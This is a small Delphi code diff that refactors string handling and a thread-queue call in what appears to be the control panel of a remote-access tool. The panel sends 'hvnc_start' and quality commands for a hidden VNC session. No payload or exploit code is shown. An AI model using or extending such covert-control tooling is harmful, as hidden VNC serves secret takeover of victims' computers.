@@ -144,7 +144,7 @@ begin
     if FIsCapturing then
     begin
       JSONObj.AddPair('action', 'hvnc_start');
-      var QualityStr := ComboBox1.Text.Replace('%', '');
+      var QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
       JSONObj.AddPair('quality', TJSONNumber.Create(StrToIntDef(QualityStr, 50)));
       Button1.Caption := 'Stop Capturing';
       LogToStatus('Starting Hidden VNC...');
@@ -187,7 +187,7 @@ begin
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'hvnc_quality');
-    var QualityStr := ComboBox1.Text.Replace('%', '');
+    var QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
     JSONObj.AddPair('quality', TJSONNumber.Create(StrToIntDef(QualityStr, 50)));
     FSendJSON(FLine, JSONObj);
   finally
@@ -238,7 +238,7 @@ begin
       finally
         FLock.Leave;
       end;
-      TThread.Queue(nil, procedure begin PaintBox1.Invalidate; end);
+      System.Classes.TThread.Queue(procedure begin PaintBox1.Invalidate; end);
     except
       // Handle corrupted frame if necessary
     end;
